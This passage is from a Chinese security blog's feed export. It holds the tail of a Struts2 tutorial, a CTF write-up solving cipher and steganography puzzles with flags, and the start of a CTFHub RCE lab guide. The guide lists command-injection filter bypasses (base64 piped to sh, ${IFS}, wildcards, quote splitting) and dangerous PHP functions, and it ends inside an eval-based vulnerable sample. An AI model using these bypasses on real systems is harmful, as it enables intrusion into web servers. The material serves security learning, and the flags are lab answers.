class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2入门案例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2入门案例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath &#125;/helloWorld.action&quot;</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2跳转页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2跳转页面成功<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第七步：部署项目"><a href="#第七步：部署项目" class="headerlink" title="第七步：部署项目"></a>第七步：部署项目</h3><p>发布项目，点击超链接<br><img src="https://img-blog.csdnimg.cn/20210319201030489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跳转成功<br><img src="https://img-blog.csdnimg.cn/20210319201255433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Struts2处理流程"><a href="#Struts2处理流程" class="headerlink" title="Struts2处理流程"></a>Struts2处理流程</h2><p>（1）用户在客户端发出HTTP请求</p><p>（2）然后请求被核心过滤器StrutsPrepareAndExecuteFilter拦截</p><p>（3）核心过滤器将请求转发到Action映射器，Action映射器负责识别当前的请求是否需要交由Struts2处理。</p><p>（4）Action映射器返回需要struts2处理的信息，StrutsPrepareAndExecuteFilter会创建一个Action代理</p><p>（5）Action代理并不知道执行哪一个Action，它会向配置管理器询问调用哪一个Action，配置管理器会从struts.xml读取我们配置的Action信息。</p><p>（6）Action代理创建相关请求的Action对象，调用相关的方法之前，struts2的一系列拦截器会帮我们做一些操作，例如获取请求参数等。</p><p>（7）然后调用execute方法根据返回的字符串去匹配相应的页面，</p><p>（8）页面可以获取一些页面模板，然后生成最终页面，再倒序的执行拦截器的后续操作</p><p>（9）最后生成HTTP响应内容</p><p><img src="https://img-blog.csdnimg.cn/20210319201448283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>编程开发</category>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋杯新年欢乐赛</title>
    <link href="/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/"/>
    <url>/2021/02/09/%E6%98%A5%E7%A7%8B%E6%9D%AF%E6%96%B0%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>摘要：记春秋杯新年欢乐赛两道题目复现</p> <a id="more"></a><h2 id="十二宫的挑衅"><a href="#十二宫的挑衅" class="headerlink" title="十二宫的挑衅"></a>十二宫的挑衅</h2><p>下载附件，解压，得到Twelve_palaces_of_serial_killers.png图片<br><img src="https://img-blog.csdnimg.cn/2021020118270295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>提取图片内容为，将密文放在excel表格中,第一个字符^，随后再向下移动一格，在向左移动两个，得到第二个字符&gt;，以此类推。<br><img src="https://img-blog.csdnimg.cn/2021020118272653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>经过重新排列，得到新的密文</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">^&gt;%..@3*&amp;<span class="hljs-comment">#(#0+@#+</span><br>.@*53)8@+@$+&amp;!%&gt;^<br>&amp;.@36%&amp;&amp;4@?<span class="hljs-comment">#&lt;!=.*</span><br>9@=(<span class="hljs-comment">#=@79@&lt;~)8%=^</span><br>=0.*/611811)*&gt;@<span class="hljs-comment">#0</span><br>0%8$+@-<span class="hljs-variable">$1</span>?*53!?7-<br>+(^(*==$<span class="hljs-variable">$5</span>*=+<span class="hljs-comment">#==^</span><br>4&amp;~<span class="hljs-variable">$7</span>%6%.&amp;?<span class="hljs-comment">#5)%51</span><br>!)<span class="hljs-comment">#?$&lt;&lt;^()8!?7%&lt;@</span><br></code></pre></td></tr></table></figure><p>在AZdecrypt软件运行后，得到一段英文<br><img src="https://img-blog.csdnimg.cn/20210201185433621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>猜测flag为flag{WUUHUU TAKE OFF}，提交后发现不对。经过尝试后，发现去掉空格提交成功。最终</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;WUUHUUTAKEOFF&#125;<br></code></pre></td></tr></table></figure><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>题目描述：对nCov了解多少？</p><p>一个题目附件和一个hint附件，hint内容为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">NB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XVGQKSKMWUG32WFUZC2Z3FNZXW22LDFVQW4YLMPFZWS4ZONB2G23AKNB2HI4DTHIXS653XO4XG4Y3CNEXG43DNFZXGS2BOM5XXML3POJTGM2LOMRSXELYKNB2HI4B2F4XXO53XFZWWK4TSPFRGS3ZOMNXW2LTDNYXWE3DPM4XWG33SN5XGC5TJOJ2XGLLJNZ2HE33EOVRXI2LPNYXGQ5DNNQFAUUDMMVQXGZJANZXXI2LDMUQFI2DFEBWGC4THMVZXIIDTORZHKY3UOVZGC3BAOBZG65DFNFXCAIAKORUGKIDQMFZXG53POJSCA2LTEB2GQZJAEBWWINJINF2CO4ZAM5SW4ZJAONSXC5LFNZRWKKJAMFXGIIDEN4QG433UEBWGK5BAORUGKIHCQCMFY3XCQCMSA2LOEBWWINJIFE======<br></code></pre></td></tr></table></figure><p>Base32解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.merrybio.com.cn/blog/SARS-CoV-2-genomic-analysis.html<br>https://www.ncbi.nlm.nih.gov/orffinder/<br>http://www.merrybio.com.cn/blog/coronavirus-introduction.html<br><br>Please notice The largest structural protein<br>the password is the md5(it<span class="hljs-string">&#x27;s gene sequence) and do not let the ‘\n’ in md5()</span><br></code></pre></td></tr></table></figure><p>三个网址，两篇介绍病毒的文章和一个基因查询网站。后面的英文句子意思是请注意最大的结构蛋白，password是md5（它的基因序列）。</p><p>在文章中搜索关键字<code>最大的结构蛋白</code>，是刺突蛋白。<br><img src="https://img-blog.csdnimg.cn/20210201162644442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>hint中所给的<a href="https://www.ncbi.nlm.nih.gov/orffinder/">查询</a>网站，要求以FASTA格式输入登录号、gi或核苷酸序列。在文本区域中输入查询序列<br><img src="https://img-blog.csdnimg.cn/20210201165625242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>文章中查找登录号<code>MN908947</code><br><img src="https://img-blog.csdnimg.cn/20210201163419968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在文章中找到范围为<code>21536-25384</code><br><img src="https://img-blog.csdnimg.cn/20210201163827698.png" alt="在这里插入图片描述"><br>输入登陆号和范围，得到基因序列<br><img src="https://img-blog.csdnimg.cn/20210201165858431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制基因序列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT<br></code></pre></td></tr></table></figure><p>md5后的值为password</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">98eb1b1760bcc837934c8695a1cee923<br></code></pre></td></tr></table></figure><p>使用MP3Stegog工具</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P <span class="hljs-number">98</span>eb1b1760bcc837934c8695a1cee923 cov.mp3<br></code></pre></td></tr></table></figure><p>得到压缩包解压密码<br><img src="https://img-blog.csdnimg.cn/20210201172036562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包，有一个hint2文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">796f75206d7573742070617920617474656e74696f6e20746f204e2070726f7465696e202c486f7720646f20746861742067657420696e746f2074686520766972616c206361707369643f0a646f20796f75206b6e6f772073746567686964653f0a7468652070617373776f726420697320656e637279707420627920566967656ec3a87265204369706865720a74686520736372656374206b65792069732054686520746f702032302063686172616374657273207769746820746865206d6f7374206f6363757272656e6365732061726520636f756e7465642b434f4d424154<br></code></pre></td></tr></table></figure><p>base16解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">you must pay attention to N protein ,How <span class="hljs-keyword">do</span> that get into the viral capsid?<br><span class="hljs-keyword">do</span> you know steghide?<br>the password is encrypt by Vigenère Cipher<br>the screct key is The top <span class="hljs-number">20</span> characters with the most occurrences are counted+COMBAT<br></code></pre></td></tr></table></figure><p>hint2提示，注意N蛋白的进入方式，steghide是图片隐写工具，password经过Vigenère加密，然后Vigenère需要的key是出现次数最多的前20个字符+<code>COMBAT</code></p><p>N蛋白结合M蛋白和E蛋白，进入病毒衣壳内<br><img src="https://img-blog.csdnimg.cn/20210201173231449.png" alt="在这里插入图片描述"><br>NME三个基因范围为分别为28274-29533、27202-27387、26523-27191<br><img src="https://img-blog.csdnimg.cn/20210201173601783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>三个蛋白的基因序列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">N基因<br>MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTA<br>SWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGK<br>MKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRN<br>PANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPG<br>SSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKS<br>AAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKH<br>WPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQV<br>ILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADL<br>DDFSKQLQQSMSSADSTQA<br>M基因<br>MFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYS<br>QLDEEQPMEID<br>E基因<br>MADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIK<br>LIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASF<br>RLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLR<br>IAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYR<br>IGNYKLNTDHSSSSDNIALLVQ<br></code></pre></td></tr></table></figure><p><a href="http://www.aihanyu.org/cncorpus/CpsTongji.aspx">在线字频分析</a>，统计前20个频率最高的字符。<br><img src="https://img-blog.csdnimg.cn/20210201174426117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有些字符的频次相同，可以调换顺序，再结尾加上hint2里面给的COMBAT，最终维吉尼亚密码的key为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">LGASTRIQKNDPFEVYMWHCCOMBAT<br></code></pre></td></tr></table></figure><p>上面提到的password在附件pass.wav中，<a href="https://sourceforge.net/projects/silenteye/">SilentEye</a>工具进行解密，得到密文<code>priebeijoarkjpxmdkucxwdus</code>。<img src="https://img-blog.csdnimg.cn/20210201175709390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>维吉尼亚解密，得到<code>eliminatenovelcoronavirts</code><br><img src="https://img-blog.csdnimg.cn/20210201175947417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用steghide提取CoV-1.jpg隐藏文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf CoV-1.jpg -p eliminatenovelcoronavirts<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210201181921964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-RCE练习</title>
    <link href="/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/01/16/CTFHub-Web-RCE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>摘要：CTFHub靶场通关（四）</p> <a id="more"></a><h1 id="什么是RCE"><a href="#什么是RCE" class="headerlink" title="什么是RCE"></a>什么是RCE</h1><p>RCE英文全称：remote command/code execute<br>分为远程命令执行和远程代码执行<br>| 分类         | 说明                       | 函数 |<br>| ———— | ————————– | —- |<br>| 远程命令执行 | 直接调用操作系统命令       | ping |<br>| 远程代码执行 | 靠执行代码调用操作系统命令 | eval |</p><h1 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h1><h2 id="Windows管道符"><a href="#Windows管道符" class="headerlink" title="Windows管道符"></a>Windows管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h2 id="Linux的管道符"><a href="#Linux的管道符" class="headerlink" title="Linux的管道符"></a>Linux的管道符</h2><table><thead><tr><th>管道符</th><th>描述</th></tr></thead><tbody><tr><td><code>;</code></td><td>执行完前面的语句再执行后面的语句。</td></tr><tr><td>`</td><td>`</td></tr><tr><td>`</td><td></td></tr><tr><td><code>&amp;</code></td><td>两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</td></tr><tr><td><code>&amp;&amp;</code></td><td>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</td></tr></tbody></table><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p>　1.拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=c;b=at;c=fl;d=ag;$a<span class="hljs-variable">$b</span> $c<span class="hljs-variable">$d</span><br>?c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;sys&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;tem&#x27;</span>;<span class="hljs-variable">$d</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$d</span>(<span class="hljs-string">&#x27;cat config.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>　2.编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash<br></code></pre></td></tr></table></figure><p>　3.单引号，双引号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t flag<br>ca<span class="hljs-string">&quot;&quot;</span>t flag<br></code></pre></td></tr></table></figure><p>　4.反斜杠</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c\at fl\ag<br></code></pre></td></tr></table></figure><p>   5.Shell 特殊变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-variable">$@t</span> flag<br>ca<span class="hljs-variable">$1t</span> flag<br></code></pre></td></tr></table></figure><p>   6.通配符绕过</p><p>常用的通配符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">* <span class="hljs-comment">#匹配任意长度字符</span><br>? <span class="hljs-comment">#匹配任意单个字符</span><br>[list] <span class="hljs-comment">#匹配指定范围(list)内的任意字符，也可以是单个字符组成的集合</span><br>[^list] <span class="hljs-comment">#匹配指定范围外的任意单个字符或字符集合</span><br>[!list]  <span class="hljs-comment">#[^list]</span><br>&#123;str1,str2&#125;<span class="hljs-comment">#匹配str1或者str2</span><br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br>cat fl[a-z]?<br>cat fla* <br>cat<span class="hljs-variable">$&#123;IFS&#125;</span>fl*<br></code></pre></td></tr></table></figure><h1 id="相关命令执行变量"><a href="#相关命令执行变量" class="headerlink" title="相关命令执行变量"></a>相关命令执行变量</h1><p>PHP代码执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">eval</span>函数、<br>preg_replace、<br>create_function函数、<br>array_map、<br>call_user_func、<br>assert、<br>call_user_func_array、<br>array_filter、<br>uasor <br></code></pre></td></tr></table></figure><p>PHP代码命令执行变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">popen、<br>proc_popen、<br>passthru、<br>system变量、<br><span class="hljs-built_in">exec</span>变量、<br>shell_exec、<br>pcntl_exec。<br></code></pre></td></tr></table></figure><h1 id="CTFHub-Web-RCE练习"><a href="#CTFHub-Web-RCE练习" class="headerlink" title="CTFHub-Web-RCE练习"></a>CTFHub-Web-RCE练习</h1><h2 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span 